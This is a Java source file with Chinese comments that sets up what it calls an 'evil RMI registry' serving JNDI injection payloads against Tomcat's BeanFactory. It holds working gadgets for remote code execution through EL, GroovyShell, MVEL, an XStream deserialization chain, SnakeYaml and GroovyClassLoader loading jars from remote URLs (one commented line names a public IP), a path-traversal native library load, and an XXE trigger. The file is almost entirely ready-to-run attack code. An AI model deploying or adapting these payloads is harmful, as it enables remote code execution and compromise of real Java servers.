package attack;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

// payload 核心部分代码

public class JndiInjectionPayload {


    private static ResourceRef elProcessor(){

        // 这里测试用的el包是org.apache.el 6.0.20，在这里下载http://www.java2s.com/Code/Jar/c/com.springsource.org.apache.htm

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));
        return ref;
    }

    private static ResourceRef execBySnakeYaml() throws NamingException, RemoteException {

        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);

        // DNS探测
        //String yaml = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\"<http://82.156.2.166:8888/exp.jar\\"]]]]">;

        // rce探测，需要暴露yaml-payload.jar
        String yaml="!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:2022/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";

        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
        //return new ReferenceWrapper((Reference) ref);
    }

    private static ResourceRef tomcatGroovyShell(){
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        String script = String.format("'%s'.execute()", "calc");
        ref.add(new StringRefAddr("x",script));
        return ref;
    }

    private static ResourceRef tomcatMLet() {
        //这次不是用于rce,而是用来进行gadget探测

        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
        ref.add(new StringRefAddr("b", "http://127.0.0.1:2022/"));
        ref.add(new StringRefAddr("c", "Thai"));
        return ref;
    }

    private static ResourceRef tomcatGroovyClassLoader() {
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=addClasspath,b=loadClass"));
        ref.add(new StringRefAddr("a", "http://127.0.0.1:2022/"));
        ref.add(new StringRefAddr("b", "thaii"));
        return ref;
    }

    private static ResourceRef tomcat_xstream(){
        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='sun.tracing.NullProvider'>\n" +
                "        <active>true</active>\n" +
                "        <providerType>java.lang.Comparable</providerType>\n" +
                "        <probes>\n" +
                "          <entry>\n" +
                "            <method>\n" +
                "              <class>java.lang.Comparable</class>\n" +
                "              <name>compareTo</name>\n" +
                "              <parameter-types>\n" +
                "                <class>java.lang.Object</class>\n" +
                "              </parameter-types>\n" +
                "            </method>\n" +
                "            <sun.tracing.dtrace.DTraceProbe>\n" +
                "              <proxy class='java.lang.Runtime'/>\n" +
                "              <implementing__method>\n" +
                "                <class>java.lang.Runtime</class>\n" +
                "                <name>exec</name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.String</class>\n" +
                "                </parameter-types>\n" +
                "              </implementing__method>\n" +
                "            </sun.tracing.dtrace.DTraceProbe>\n" +
                "          </entry>\n" +
                "        </probes>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>calc</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        ref.add(new StringRefAddr("forceString", "a=fromXML"));
        ref.add(new StringRefAddr("a", xml));
        return ref;
    }

    private static ResourceRef tomcat_MVEL(){
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=exec"));
        ref.add(new StringRefAddr("a",
                "push Runtime.getRuntime().exec('calc');"));
        return ref;
    }

    private static ResourceRef tomcat_loadLibrary(){
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        //linux
        //ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../../../../../tmp/libcmd"));
        //win
        ref.add(new StringRefAddr("a", "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\20281\\Desktop\\libcmd"));
        return ref;
    }

    private static ResourceRef XXEexp(){
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);

        // ps:触发xxe需要在xxe文件夹下开启python http服务，使exp.xml可以被访问
        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/exp.xml"));
        return ref;
    }

    public static void main(String[] args) throws Exception{

        System.out.println("Creating evil RMI registry on port 1098");
        Registry registry = LocateRegistry.createRegistry(1098);


// TODO: 支持高度自定义化payload
//        org.apache.naming.ResourceRef ref = new org.apache.naming.ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
//        ref.add(new StringRefAddr("forceString", "x=evaluate"));
//        String script = String.format("'%s'.execute()", "calc");
//        ref.add(new StringRefAddr("x",script));

//        // payload 设置


//        // SnakeYaml
//        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper( JndiInjectionPayload.execBySnakeYaml());
//        registry.bind("execBySnakeYaml", referenceWrapper);

//        // GroovyShell
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(JndiInjectionPayload.tomcatGroovyShell());
        registry.bind("ExecByGroovy", referenceWrapper);

//        // MLet
//        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper( JndiInjectionPayload.tomcatMLet());
//        registry.bind("tomcatMLet", referenceWrapper);
//        // el
//        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(JndiInjectionPayload.elProcessor());
//        registry.bind("elProcessor", referenceWrapper);

//         // GroovyClassLoader
//        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper( JndiInjectionPayload.tomcatGroovyClassLoader());
//        registry.bind("tomcatGroovyClassLoader", referenceWrapper);

//        // tomcat_xstream
//        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper( JndiInjectionPayload.tomcat_xstream());
//        registry.bind("tomcat_xstream", referenceWrapper);

//        // MVEL
//        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper( JndiInjectionPayload.tomcat_MVEL());
//        registry.bind("tomcat_MVEL", referenceWrapper);

//        // loadLibrary
//        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper( JndiInjectionPayload.tomcat_loadLibrary());
//        registry.bind("tomcat_loadLibrary", referenceWrapper);

//        // XXE
//        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper( JndiInjectionPayload.XXEexp());
//        registry.bind("XXEexp", referenceWrapper);
    }
}
